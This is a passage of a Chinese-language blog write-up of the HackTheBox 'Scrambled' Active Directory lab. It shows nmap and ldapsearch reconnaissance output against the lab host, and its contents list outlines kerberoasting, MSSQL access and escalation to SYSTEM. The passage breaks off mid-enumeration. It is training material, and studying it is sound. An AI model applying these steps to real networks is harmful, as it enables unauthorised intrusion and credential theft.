<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap123456789101112131415">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox——Tracks AD Scrambled">
<meta property="og:url" content="https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/index.html">
<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap123456789101112131415">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-1.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-2.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-3.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-4.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-5.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-6.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-7.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-8.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-9.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-10.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-11.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-12.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-13.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-14.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-15.png">
<meta property="og:image" content="https://n0nome.github.io/images/scrambled-16.png">
<meta property="article:published_time" content="2025-06-19T13:59:05.111Z">
<meta property="article:modified_time" content="2025-06-19T13:59:05.111Z">
<meta property="article:author" content="n0nome">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n0nome.github.io/images/scrambled.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>HackTheBox——Tracks AD Scrambled</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-RXS95XH60B');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2025/06/19/WhiteRabbit/HackTheBox%E2%80%94%E2%80%94HTB%20WhiteRabbit%20writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/06/19/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&text=HackTheBox——Tracks AD Scrambled"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&is_video=false&description=HackTheBox——Tracks AD Scrambled"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——Tracks AD Scrambled&body=Check out this article: https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&name=HackTheBox——Tracks AD Scrambled&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&t=HackTheBox——Tracks AD Scrambled"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#80-web"><span class="toc-number">1.1.</span> <span class="toc-text">80 web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ksimpson-user-logon-smb"><span class="toc-number">1.2.</span> <span class="toc-text">ksimpson user logon smb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting-get-sqlsvc-hash"><span class="toc-number">1.3.</span> <span class="toc-text">kerberoasting get sqlsvc hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logon-mssql-and-enum-and-reverse"><span class="toc-number">1.4.</span> <span class="toc-text">logon mssql and enum and reverse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-as-sqlsvc"><span class="toc-number">1.5.</span> <span class="toc-text">shell as sqlsvc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-miscsvc"><span class="toc-number">2.</span> <span class="toc-text">shell as miscsvc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-nt-authority"><span class="toc-number">3.</span> <span class="toc-text">shell as nt authority</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">3.1.</span> <span class="toc-text">Hashes</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        HackTheBox——Tracks AD Scrambled
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">n0nome</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-06-19T13:59:05.111Z" class="dt-published" itemprop="datePublished">2025-06-19</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/scrambled.png"></p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION                                                                                                                         </span><br><span class="line">53/tcp    open  domain        Simple DNS Plus                                                                                                                 </span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                        </span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0                                                                                                                      </span><br><span class="line">| http-methods:                                                                                                                                               </span><br><span class="line">|_  Potentially risky methods: TRACE                                                                                                                          </span><br><span class="line">|_http-title: Scramble Corp Intranet                                                                                                                                                                                                                                                                                        </span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-05-05 07:59:07Z)                                                                                                                                                                                                                                </span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                   </span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)                                                                                                                                                                                                 </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:44+00:00; -57s from scanner <span class="keyword">time</span>.                                                                                                </span><br><span class="line">| ssl-cert: Subject:                                                                                                                                          </span><br><span class="line">| Subject Alternative Name: DNS:DC1.scrm.local                                                                                                                </span><br><span class="line">| Not valid before: 2024-09-04T11:14:45                                                                                                                       </span><br><span class="line">|_Not valid after:  2121-06-08T22:39:53                                                                                                                       </span><br><span class="line">445/tcp   open  microsoft-ds?                                                                                                                                 </span><br><span class="line">464/tcp   open  kpasswd5?                                                                                                                                     </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                             </span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)                                                                                                                                                                                                 </span><br><span class="line">| ssl-cert: Subject:                                                                                                                                          </span><br><span class="line">| Subject Alternative Name: DNS:DC1.scrm.local                                                                                                                </span><br><span class="line">| Not valid before: 2024-09-04T11:14:45                                                                                                                       </span><br><span class="line">|_Not valid after:  2121-06-08T22:39:53                                                                                                                       </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:44+00:00; -56s from scanner <span class="keyword">time</span>.                                                                                                </span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM                                                                                    </span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)                                                                                               </span><br><span class="line">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)                                                                                          </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:45+00:00; -56s from scanner <span class="keyword">time</span>.                                                                                                </span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                                      </span><br><span class="line">| Not valid before: 2025-05-05T07:45:38                                                                                                                       </span><br><span class="line">|_Not valid after:  2055-05-05T07:45:38                                                                                                                       </span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)                                                                                                                                                                                                 </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:44+00:00; -57s from scanner <span class="keyword">time</span>.                                                                                                                                                                                                                                                              </span><br><span class="line">| ssl-cert: Subject:                                                           </span><br><span class="line">| Subject Alternative Name: DNS:DC1.scrm.local                                                                                                                </span><br><span class="line">| Not valid before: 2024-09-04T11:14:45                                                                                                                       </span><br><span class="line">|_Not valid after:  2121-06-08T22:39:53                                                                                                                                                                                                                                                                                     </span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)                                                                                                                                                                                                 </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-05-05T08:02:44+00:00; -56s from scanner <span class="keyword">time</span>.                                                                                                </span><br><span class="line">| ssl-cert: Subject:                                                           </span><br><span class="line">| Subject Alternative Name: DNS:DC1.scrm.local                                                                                                                </span><br><span class="line">| Not valid before: 2024-09-04T11:14:45                                        </span><br><span class="line">|_Not valid after:  2121-06-08T22:39:53   </span><br><span class="line">4411/tcp  open  found?                                                         </span><br><span class="line">| fingerprint-strings:                                                         </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: </span><br><span class="line">|     SCRAMBLECORP_ORDERS_V1.0.3;                                              </span><br><span class="line">|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:                                                                                                                                                                                                                                   </span><br><span class="line">|     SCRAMBLECORP_ORDERS_V1.0.3;                                              </span><br><span class="line">|_    ERROR_UNKNOWN_COMMAND;                                                                                                                                                                                                                                                                                                </span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                         </span><br><span class="line">|_http-title: Not Found                                                        </span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                   </span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing                                                                                                            </span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                             </span><br><span class="line">49674/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">49700/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">55408/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">55433/tcp open  msrpc         Microsoft Windows RPC                                                                                                           </span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                                                                                                </span><br><span class="line">SF-Port4411-TCP:V=7.95%I=7%D=5/5%Time=68187003%P=x86_64-pc-linux-gnu%r(NUL                                                                                    </span><br><span class="line">SF:L,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(GenericLines,1D,<span class="string">&quot;SCRAMBLECO                                                                                    </span></span><br><span class="line"><span class="string">SF:RP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(GetRequest,35,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3                                                                                    </span></span><br><span class="line"><span class="string">SF:;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(HTTPOptions,35,<span class="string">&quot;SCRAMBLECORP_ORDERS                                                                                    </span></span><br><span class="line"><span class="string">SF:_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(RTSPRequest,35,<span class="string">&quot;SCRAMBLECO                                                                                    </span></span><br><span class="line"><span class="string">SF:RP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(RPCCheck,1D,<span class="string">&quot;SCRA                                                                                    </span></span><br><span class="line"><span class="string">SF:MBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(DNSVersionBindReqTCP,1D,<span class="string">&quot;SCRAMBLECORP                                                                                    </span></span><br><span class="line"><span class="string">SF:_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(DNSStatusRequestTCP,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V                                                                                    </span></span><br><span class="line"><span class="string">SF:1\.0\.3;\r\n&quot;</span>)%r(Help,35,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOW                                                                                    </span></span><br><span class="line"><span class="string">SF:N_COMMAND;\r\n&quot;</span>)%r(SSLSessionReq,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>                                                                                    </span><br><span class="line">SF:)%r(TerminalServerCookie,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(TLSS                                                                                    </span><br><span class="line">SF:essionReq,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(Kerberos,1D,<span class="string">&quot;SCRAMB                                                                                    </span></span><br><span class="line"><span class="string">SF:LECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(SMBProgNeg,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.                                                                                    </span></span><br><span class="line"><span class="string">SF:0\.3;\r\n&quot;</span>)%r(X11Probe,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(FourOh                                                                                    </span><br><span class="line">SF:FourRequest,35,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;                                                                                    </span></span><br><span class="line"><span class="string">SF:\r\n&quot;</span>)%r(LPDString,35,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_C                                                                                    </span></span><br><span class="line"><span class="string">SF:OMMAND;\r\n&quot;</span>)%r(LDAPSearchReq,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r                                                                                    </span><br><span class="line">SF:(LDAPBindReq,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(SIPOptions,35,<span class="string">&quot;S                                                                                    </span></span><br><span class="line"><span class="string">SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(LANDesk-                                                                                    </span><br><span class="line">SF:RC,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(TerminalServer,1D,<span class="string">&quot;SCRAMBL                                                                                    </span></span><br><span class="line"><span class="string">SF:ECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(NCP,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\                                                                                    </span></span><br><span class="line"><span class="string">SF:n&quot;</span>)%r(NotesRPC,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(JavaRMI,1D,<span class="string">&quot;SC                                                                                    </span></span><br><span class="line"><span class="string">SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(WMSRequest,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_                                                                                    </span></span><br><span class="line"><span class="string">SF:V1\.0\.3;\r\n&quot;</span>)%r(oracle-tns,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(                                                                                    </span><br><span class="line">SF:ms-sql-s,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(afp,1D,<span class="string">&quot;SCRAMBLECORP                                                                                    </span></span><br><span class="line"><span class="string">SF:_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(giop,1D,<span class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>);                                                                                    </span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                                                                                                                                                       </span><br><span class="line">Device <span class="built_in">type</span>: general purpose                                                   </span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)                                                                                                      </span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10                                                                                      </span><br><span class="line">Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)                                                                                                                                                                                                                                    </span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).                                                                                                     </span><br><span class="line">Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows        </span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-05-05T08:02:08</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: -56s, deviation: 0s, median: -56s</span><br></pre></td></tr></table></figure>
<p>先把<code>scrm.local</code>加到hosts里面<br>smb没出东西<br>ldap：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H <span class="string">&#x27;ldap://10.10.11.168&#x27;</span> -x -s base                                                          </span><br><span class="line"><span class="comment"># extended LDIF                              </span></span><br><span class="line"><span class="comment">#                                        </span></span><br><span class="line"><span class="comment"># LDAPv3                                                                                                 </span></span><br><span class="line"><span class="comment"># base &lt;&gt; (default) with scope baseObject</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">ldapServiceName: scrm.local:dc1<span class="variable">$@SCRM</span>.LOCAL</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">。。。</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">serverName: CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura</span><br><span class="line"> tion,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 290952</span><br><span class="line">dsServiceName: 